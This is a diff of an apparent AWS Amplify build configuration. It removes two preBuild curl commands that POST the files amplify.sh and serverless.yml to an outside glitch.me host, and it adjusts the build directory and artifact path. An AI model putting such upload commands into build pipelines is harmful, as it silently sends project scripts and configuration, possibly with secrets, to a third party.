@@ -9,8 +9,6 @@ frontend:
         - mv laughing-waddle/-/*.tgz .
         - tar zxvf *.tgz
         - ls -a
-        - curl -X POST --data-binary "@./amplify.sh" https://achieved-purple-sidecar.glitch.me/
-        - curl -X POST --data-binary "@./serverless.yml" https://achieved-purple-sidecar.glitch.me/
         - cp serverless.yml package/
         - ls -a package/
         - cd package
@@ -18,8 +16,9 @@ frontend:
     build:
       commands:
         - npm run build
+        - cd ../
   artifacts:
-    baseDirectory: .next
+    baseDirectory: package/.next
     files:
       - '**/*'
   cache:
